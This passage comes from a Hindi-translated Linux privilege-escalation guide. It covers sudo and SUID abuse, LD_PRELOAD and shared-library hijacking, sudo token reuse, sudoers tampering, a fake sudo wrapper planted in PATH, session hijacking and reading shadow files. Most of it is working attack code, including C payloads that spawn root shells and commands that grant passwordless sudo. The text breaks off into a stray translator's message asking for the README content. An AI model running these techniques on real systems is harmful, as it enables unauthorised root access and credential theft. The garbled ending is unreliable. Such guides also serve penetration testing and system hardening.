यदि किसी नीति में user या group specify नहीं किया गया है तो वह सार्वभौमिक रूप से लागू होती है, जबकि "default" context policies उन सभी पर लागू होती हैं जिन्हें अन्य specific policies कवर नहीं कर रही होती हैं।
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**यहाँ D-Bus communication को enumerate और exploit करना सीखें:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **नेटवर्क**

नेटवर्क को enumerate करना और मशीन की स्थिति पता लगाना हमेशा दिलचस्प होता है।

### सामान्य enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

हमेशा उन नेटवर्क सेवाओं को चेक करें जो मशीन पर चल रही हों और जिनके साथ आप एक्सेस करने से पहले इंटरैक्ट नहीं कर पाए थे:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

जाँचें कि क्या आप sniff traffic कर सकते हैं। यदि आप कर पाएँ तो आप कुछ credentials प्राप्त कर सकते हैं।
```
timeout 1 tcpdump
```
## Users

### Generic Enumeration

जाँचें कि आप **who** हैं, आपके पास कौन से **privileges** हैं, सिस्टम में कौन से **users** हैं, कौन **login** कर सकते हैं और किसके पास **root privileges** हैं:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### बड़ा UID

कुछ Linux वर्ज़न एक बग से प्रभावित थे जो **UID > INT_MAX** वाले उपयोगकर्ताओं को privileges escalate करने की अनुमति देता है। More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### समूह

जाँचें कि क्या आप **किसी समूह के सदस्य** हैं जो आपको root privileges दे सकता है:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### क्लिपबोर्ड

अगर संभव हो तो जाँचें कि क्लिपबोर्ड के अंदर कुछ दिलचस्प तो नहीं।
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### पासवर्ड नीति
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### ज्ञात पासवर्ड

यदि आप किसी पर्यावरण का कोई भी **पासवर्ड जानते हैं** तो उसी पासवर्ड का उपयोग करके प्रत्येक **उपयोगकर्ता** के रूप में लॉगिन करने का प्रयास करें।

### Su Brute

यदि आपको बहुत शोर करने में आपत्ति नहीं है और कंप्यूटर पर `su` और `timeout` बाइनरीज़ मौजूद हैं, तो आप [su-bruteforce](https://github.com/carlospolop/su-bruteforce) का उपयोग करके उपयोगकर्ता पर brute-force आज़मा सकते हैं।\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` पैरामीटर के साथ भी उपयोगकर्ताओं पर brute-force करने की कोशिश करता है।

## Writable PATH का दुरुपयोग

### $PATH

यदि आप पाते हैं कि आप **$PATH के किसी फ़ोल्डर के भीतर लिख सकते हैं** तो आप विशेषाधिकार बढ़ा सकते हैं — **लिखने योग्य फ़ोल्डर के अंदर एक backdoor बनाकर** जिसका नाम उस कमांड जैसा होगा जिसे किसी अन्य उपयोगकर्ता (आदर्श रूप से root) द्वारा चलाया जाना है और जो **आपके लिखने योग्य फ़ोल्डर से पहले स्थित किसी फ़ोल्डर से लोड नहीं होता**।

### SUDO और SUID

आपको sudo का उपयोग करके कुछ कमांड चलाने की अनुमति मिल सकती है या उन पर suid बिट सेट हो सकता है। इसे जांचने के लिए उपयोग करें:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
कुछ **अनपेक्षित commands आपको फ़ाइलें पढ़ने और/या लिखने या यहां तक कि कोई command निष्पादित करने की अनुमति देते हैं।** उदाहरण के लिए:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo configuration किसी उपयोगकर्ता को बिना पासवर्ड जाने किसी अन्य उपयोगकर्ता के अधिकारों के साथ कोई कमांड चलाने की अनुमति दे सकती है।
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
इस उदाहरण में उपयोगकर्ता `demo` `root` के रूप में `vim` चला सकता है; अब root directory में एक ssh key जोड़कर या `sh` कॉल करके एक shell प्राप्त करना बहुत आसान है।
```
sudo vim -c '!sh'
```
### SETENV

यह निर्देश उपयोगकर्ता को किसी चीज़ को निष्पादित करते समय **set an environment variable** करने की अनुमति देता है:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
यह उदाहरण, **HTB machine Admirer पर आधारित**, **PYTHONPATH hijacking** के प्रति **कमज़ोर** था, जिससे script को root के रूप में चलाते समय किसी भी python library को लोड किया जा सकता था:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo execution bypassing paths

**Jump** अन्य फ़ाइलें पढ़ने के लिए या **symlinks** का उपयोग करें। उदाहरण के लिए sudoers फ़ाइल में: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
यदि कोई **wildcard** (\*) इस्तेमाल किया गया हो, तो यह और भी आसान है:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**निवारक उपाय**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary without command path

यदि **sudo permission** किसी एक कमांड को **path निर्दिष्ट किए बिना** दिया गया है: _hacker10 ALL= (root) less_ तो आप PATH variable बदलकर इसे exploit कर सकते हैं।
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
यह तकनीक तब भी उपयोग की जा सकती है यदि कोई **suid** binary **किसी अन्य command को बिना path बताए execute करता है (हमेशा अजीब SUID binary की सामग्री को _**strings**_ से जांचें)**।

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary जिसमें command path दिया हो

यदि **suid** binary **किसी अन्य command को path बताकर execute करता है**, तो आप उस command के नाम की **function** बनाकर और उसे **export** करके कोशिश कर सकते हैं जिसे suid file कॉल कर रहा है।

उदाहरण के लिए, यदि एक suid binary calls _**/usr/sbin/service apache2 start**_ तो आपको उस command के नाम की function बनाने और उसे export करने की कोशिश करनी होगी:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
फिर, जब आप suid binary को कॉल करते हैं, यह function निष्पादित होगा

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable का उपयोग loader द्वारा अन्य सभी लाइब्रेरियों से पहले एक या अधिक shared libraries (.so files) को लोड करने के लिए किया जाता है, जिनमें standard C library (`libc.so`) भी शामिल है। इस प्रक्रिया को library preloading कहा जाता है।

हालाँकि, system security बनाए रखने और इस फीचर के exploitation को रोकने के लिए, विशेष रूप से **suid/sgid** executables के साथ, सिस्टम कुछ शर्तें लागू करता है:

- loader उन executables के लिए **LD_PRELOAD** को अनदेखा कर देता है जहाँ real user ID (_ruid_) और effective user ID (_euid_) मेल नहीं खाते।
- suid/sgid वाले executables के लिए, केवल standard paths में मौजूद और स्वयं suid/sgid वाले libraries ही preload होते हैं।

Privilege escalation तब हो सकती है जब आपके पास `sudo` के साथ commands execute करने की क्षमता हो और `sudo -l` के output में **env_keep+=LD_PRELOAD** स्टेटमेंट शामिल हो। यह configuration **LD_PRELOAD** environment variable को तब भी बनाए रखने और मान्यता देने की अनुमति देता है जब commands `sudo` के साथ चलाए जाते हैं, जिससे संभावित रूप से elevated privileges के साथ arbitrary code का निष्पादन हो सकता है।
```
Defaults        env_keep += LD_PRELOAD
```
इसे **/tmp/pe.c** के रूप में सहेजें
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
फिर **compile it** का उपयोग करके:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
अंत में, **escalate privileges** चलाकर
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> एक समान privesc का दुरुपयोग किया जा सकता है अगर attacker **LD_LIBRARY_PATH** env variable को नियंत्रित करता है, क्योंकि वह उस path को नियंत्रित करता है जहाँ libraries खोजी जाएँगी।
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

जब किसी बाइनरी में **SUID** permissions हों और वह असामान्य लगे, तो यह अच्छा अभ्यास है कि यह जांचें कि क्या वह ठीक से **.so** फाइलें लोड कर रहा है। इसे निम्न कमांड चलाकर चेक किया जा सकता है:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
उदाहरण के लिए, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ जैसी त्रुटि मिलने पर संभावित exploitation का संकेत मिलता है।

इसे exploit करने के लिए, आप एक C फ़ाइल बनाएँगे, मान लें _"/path/to/.config/libcalc.c"_, जिसमें निम्नलिखित कोड होगा:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
यह code, एक बार compile और execute होने पर, file permissions को manipulate करके और elevated privileges के साथ shell को execute करके privileges बढ़ाने का लक्ष्य रखता है।

ऊपर दिए गए C file को shared object (.so) file में निम्नानुसार compile करें:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
अंत में, प्रभावित SUID बाइनरी को चलाने से exploit ट्रिगर हो जाना चाहिए, जिससे संभावित system compromise की अनुमति मिल सकती है।

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
अब जब हमने एक SUID binary पाया है जो ऐसी फ़ोल्डर से लाइब्रेरी लोड कर रहा है जिसमें हम लिख सकते हैं, तो चलिए आवश्यक नाम के साथ उस फ़ोल्डर में लाइब्रेरी बनाते हैं:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
यदि आपको इस तरह की त्रुटि मिलती है
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
इसका मतलब है कि आपने जो लाइब्रेरी जनरेट की है उसमें `a_function_name` नाम का एक फ़ंक्शन होना चाहिए।

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) Unix binaries की एक क्यूरेटेड सूची है जिन्हें attacker द्वारा स्थानीय सुरक्षा प्रतिबंधों को बायपास करने के लिए exploit किया जा सकता है। [**GTFOArgs**](https://gtfoargs.github.io/) वही है लेकिन उन मामलों के लिए जहाँ आप **केवल arguments inject** कर सकते हैं किसी command में।

यह project Unix binaries के legitimate functions को इकट्ठा करता है जिन्हें abuse करके restricted shells से बाहर निकलना, privileges escalate या बनाए रखना, files transfer करना, bind और reverse shells spawn करना और अन्य post-exploitation tasks को आसान बनाना संभव है।

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

यदि आप `sudo -l` तक पहुँच सकते हैं, तो आप टूल [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) का उपयोग कर सकते हैं यह जांचने के लिए कि यह किसी भी sudo नियम को exploit करने का तरीका ढूंढता है या नहीं।

### Reusing Sudo Tokens

ऐसे मामलों में जहाँ आपके पास **sudo access** है लेकिन password नहीं है, आप privileges escalate कर सकते हैं **एक sudo command के execution का इंतजार करके और फिर session token को hijack करके**।

Requirements to escalate privileges:

- आपके पास पहले से shell होना चाहिए user "_sampleuser_" के रूप में
- "_sampleuser_" ने **`sudo` का उपयोग** करके कुछ execute किया होना चाहिए **पिछले 15mins** में (default में यही sudo token की अवधि है जो हमें `sudo` का उपयोग बिना password दिए करने देती है)
- `cat /proc/sys/kernel/yama/ptrace_scope` 0 होना चाहिए
- `gdb` accessible होना चाहिए (आप इसे upload कर पाने में सक्षम होने चाहिए)

(आप अस्थायी रूप से `ptrace_scope` को `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` के साथ enable कर सकते हैं या स्थायी रूप से `/etc/sysctl.d/10-ptrace.conf` को modify करके और `kernel.yama.ptrace_scope = 0` सेट करके)

यदि ये सभी आवश्यकताएँ पूरी हो जाती हैं, **आप निम्न का उपयोग करके privileges escalate कर सकते हैं:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- पहला **exploit** (`exploit.sh`) binary `activate_sudo_token` को _/tmp_ में बनाएगा। आप इसका उपयोग अपने session में **sudo token activate करने के लिए** कर सकते हैं (आपको स्वतः ही root shell नहीं मिलेगा, `sudo su` करें):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- यह **second exploit** (`exploit_v2.sh`) _/tmp_ में एक sh shell बनाएगा जो **root के स्वामित्व में और setuid के साथ**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- यह **तीसरा exploit** (`exploit_v3.sh`) **sudoers file बनाएगा** जो **sudo tokens को स्थायी बना देता है और सभी उपयोगकर्ताओं को sudo का उपयोग करने की अनुमति देता है**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

यदि आपके पास उस फ़ोल्डर में या फ़ोल्डर के अंदर बनाए गए किसी भी फ़ाइल पर लिखने की अनुमति है, तो आप बाइनरी [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) का उपयोग करके **किसी user और PID के लिए sudo token बना** सकते हैं.\
उदाहरण के लिए, अगर आप फ़ाइल _/var/run/sudo/ts/sampleuser_ को overwrite कर सकते हैं और उस user के रूप में आपके पास PID 1234 वाला shell है, तो आप पासवर्ड जाने बिना निम्नलिखित करके **sudo privileges** प्राप्त कर सकते हैं:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

फ़ाइल `/etc/sudoers` और `/etc/sudoers.d` के अंदर की फ़ाइलें यह निर्धारित करती हैं कि कौन `sudo` का उपयोग कर सकता है और कैसे।\
**यदि** आप इस फ़ाइल को **पढ़** सकते हैं तो आप **कुछ रोचक जानकारी प्राप्त कर सकते हैं**, और यदि आप किसी भी फ़ाइल को **लिख** सकते हैं तो आप **escalate privileges** कर पाएंगे।
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
यदि आप लिख सकते हैं, तो आप इस अनुमति का दुरुपयोग कर सकते हैं।
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
इन permissions का दुरुपयोग करने का एक और तरीका:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` बाइनरी के कुछ विकल्प हैं, जैसे OpenBSD के लिए `doas`; इसकी कॉन्फ़िगरेशन `/etc/doas.conf` पर जांचना न भूलें।
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

यदि आप जानते हैं कि **user आमतौर पर किसी machine से कनेक्ट होता है और `sudo` का उपयोग करता है** और आपने उस user context में एक shell हासिल कर लिया है, तो आप **create a new sudo executable** कर सकते हैं जो पहले आपकी code को root के रूप में चलाएगा और फिर user के कमांड को चलाएगा। फिर, user context का **$PATH** modify करें (उदाहरण के लिए नया path `.bash_profile` में जोड़कर) ताकि जब user `sudo` चलाए तो आपका sudo executable executed हो।

ध्यान दें कि यदि user कोई अलग shell (bash नहीं) उपयोग करता है तो नया path जोड़ने के लिए आपको अन्य files modify करनी पड़ेंगी। उदाहरण के लिए[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifies `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. आप एक और उदाहरण [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) में पा सकते हैं।

या कुछ इस तरह चलाना:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## साझा लाइब्रेरी

### ld.so

फ़ाइल `/etc/ld.so.conf` यह बताती है कि **लोड की गई कॉन्फ़िगरेशन फ़ाइलें कहाँ से हैं**। आमतौर पर, इस फ़ाइल में निम्नलिखित path होता है: `include /etc/ld.so.conf.d/*.conf`

इसका मतलब है कि `/etc/ld.so.conf.d/*.conf` से कॉन्फ़िगरेशन फ़ाइलें पढ़ी जाएँगी। ये कॉन्फ़िगरेशन फ़ाइलें उन अन्य फ़ोल्डरों की तरफ़ इशारा करती हैं जहाँ **लाइब्रेरीज़** खोजी जाएँगी। उदाहरण के लिए, `/etc/ld.so.conf.d/libc.conf` की सामग्री `/usr/local/lib` है। **इसका मतलब है कि सिस्टम `/usr/local/lib` के अंदर लाइब्रेरीज़ की खोज करेगा**।

यदि किसी कारणवश किसी उपयोगकर्ता के पास इन में से किसी भी path पर **write permissions** हों: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` के अंदर कोई भी फ़ाइल, या `/etc/ld.so.conf.d/*.conf` में निर्दिष्ट किसी config फ़ाइल द्वारा दर्शाए गए किसी भी फ़ोल्डर पर, तो वह privileges escalate कर सकता है.\
देखें कि **इस misconfiguration को कैसे exploit किया जाए** निम्न पृष्ठ में:

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib को `/var/tmp/flag15/` में कॉपी करने पर इसे प्रोग्राम द्वारा उसी स्थान पर उपयोग किया जाएगा जैसा कि `RPATH` वेरिएबल में निर्दिष्ट है।
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
फिर `/var/tmp` में `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` का उपयोग करके एक evil library बनाएं।
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## क्षमताएँ

Linux capabilities प्रोसेस को उपलब्ध root privileges का एक **subset** प्रदान करती हैं। यह प्रभावी रूप से root **privileges को छोटे और विशिष्ट इकाइयों में विभाजित** कर देता है। इनमें से प्रत्येक इकाई को स्वतंत्र रूप से processes को दिया जा सकता है। इस तरह privileges का पूरा सेट कम हो जाता है, जिससे exploitation के जोखिम घटते हैं।\
Read the following page to **learn more about capabilities and how to abuse them**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## डायरेक्टरी अनुमतियाँ

एक directory में, **bit for "execute"** का अर्थ है कि प्रभावित user उस फ़ोल्डर में "**cd**" कर सकता है।\
**"read"** बिट का अर्थ है कि user फ़ाइलों को **list** कर सकता है, और **"write"** बिट का अर्थ है कि user फ़ाइलों को **delete** और **create** कर सकता है।

## ACLs

Access Control Lists (ACLs) डिस्क्रीशनरी permissions की secondary layer को दर्शाते हैं, जो पारंपरिक ugo/rwx permissions को **overriding** करने में सक्षम हैं। ये permissions file या directory access पर नियंत्रण बढ़ाते हैं क्योंकि ये मालिक नहीं या समूह का हिस्सा नहीं होने वाले specific users को अधिकार देने या नकारने की अनुमति देते हैं। यह स्तर **granularity सुनिश्चित करता है कि access management अधिक सटीक हो**। Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Give** user "kali" को किसी file पर read और write permissions दें:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**प्राप्त करें** सिस्टम से विशिष्ट ACLs वाली फ़ाइलें:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## खुले shell sessions

**पुराने संस्करणों** में आप किसी अन्य user (**root**) के किसी **shell** session को **hijack** कर सकते हैं.\
**नवीनतम संस्करणों** में आप केवल अपने **user** के screen sessions से ही **connect** कर पाएंगे। हालांकि, आप **session के अंदर रोचक जानकारी** पा सकते हैं।

### screen sessions hijacking

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**सत्र से जुड़ें**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

यह समस्या **पुराने tmux संस्करणों** के साथ थी। मैं एक गैर-प्रिविलेज्ड उपयोगकर्ता के रूप में root द्वारा बनाया गया tmux (v2.1) session hijack करने में सक्षम नहीं था।

**tmux sessions सूचीबद्ध करें**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**एक session से जुड़ें**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
This bug is caused when creating a new ssh key in those OS, as **only 32,768 variations were possible**. This means that all the possibilities can be calculated and **having the ssh public key you can search for the corresponding private key**. You can find the calculated possibilities here: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** यह निर्धारित करता है कि password authentication की अनुमति है या नहीं। डिफ़ॉल्ट `no` है।
- **PubkeyAuthentication:** यह निर्धारित करता है कि public key authentication की अनुमति है या नहीं। डिफ़ॉल्ट `yes` है।
- **PermitEmptyPasswords**: जब password authentication की अनुमति हो, यह निर्धारित करता है कि सर्वर खाली password स्ट्रिंग वाले खाते में login की अनुमति देता है या नहीं। डिफ़ॉल्ट `no` है।

### PermitRootLogin

Specifies whether root can log in using ssh, default is `no`. Possible values:

- `yes`: root password और private key का उपयोग करके login कर सकता है
- `without-password` or `prohibit-password`: root केवल private key से ही login कर सकता है
- `forced-commands-only`: Root केवल private key का उपयोग करके और यदि commands options निर्दिष्ट हों तभी login कर सकता है
- `no` : नहीं

### AuthorizedKeysFile

यह उन फाइलों को निर्दिष्ट करता है जिनमें वे public keys होती हैं जो user authentication के लिए उपयोग की जा सकती हैं। इसमें `%h` जैसे टोकन हो सकते हैं, जिन्हें home directory से प्रतिस्थापित किया जाएगा। **आप absolute paths** (starting in `/`) **या user के home से relative paths** निर्दिष्ट कर सकते हैं। For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
यह configuration संकेत करेगा कि अगर आप उपयोगकर्ता "**testusername**" की **private** key से login करने की कोशिश करते हैं तो ssh आपके key के **public key** की तुलना `/home/testusername/.ssh/authorized_keys` और `/home/testusername/access` में मौजूद keys से करेगा।

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding आपको यह अनुमति देता है कि आप **use your local SSH keys instead of leaving keys** (बिना passphrases!) अपने सर्वर पर रखे बिना उपयोग कर सकें। इसलिए, आप ssh के माध्यम से **jump** करके **to a host** पहुँच सकते हैं और वहाँ से दूसरे host पर **jump to another** कर सकते हैं, **using** उस **key** का जो आपके **initial host** पर स्थित है।

आपको यह option `$HOME/.ssh.config` में इस तरह सेट करनी होगी:
```
Host example.com
ForwardAgent yes
```
ध्यान दें कि यदि `Host` `*` है तो हर बार जब उपयोगकर्ता किसी अलग मशीन पर जाता है, उस होस्ट को keys तक पहुँच प्राप्त होगी (जो एक सुरक्षा समस्या है)।

The file `/etc/ssh_config` can **override** this **options** and allow or denied this configuration.\
The file `/etc/sshd_config` can **allow** or **denied** ssh-agent forwarding with the keyword `AllowAgentForwarding` (default is allow).

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## दिलचस्प फ़ाइलें

### प्रोफ़ाइल फ़ाइलें

The file `/etc/profile` and the files under `/etc/profile.d/` are **scripts that are executed when a user runs a new shell**. Therefore, यदि आप उनमें से किसी को भी **लिख या संशोधित** कर सकते हैं तो आप **escalate privileges** कर सकते हैं।
```bash
ls -l /etc/profile /etc/profile.d/
```
If any weird profile script is found you should check it for **संवेदनशील जानकारी**.

### Passwd/Shadow फ़ाइलें

Depending on the OS the `/etc/passwd` and `/etc/shadow` files may be using a different name or there may be a backup. Therefore it's recommended **इन सबको खोजें** और **जाँचें कि आप इन्हें पढ़ सकते हैं** ताकि देखा जा सके **यदि फ़ाइलों के अंदर hashes मौजूद हैं**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
कुछ मामलों में आप `/etc/passwd` (या समकक्ष) फ़ाइल के अंदर **password hashes** पा सकते हैं
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Writable /etc/passwd

सबसे पहले, निम्नलिखित में से किसी एक कमांड का उपयोग करके एक password जनरेट करें।
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
मैं फ़ाइल src/linux-hardening/privilege-escalation/README.md का अनुवाद करने के लिए उसकी सामग्री चाहिए। कृपया उस README.md की पूरी सामग्री पेस्ट करें।

साथ ही बताइए:
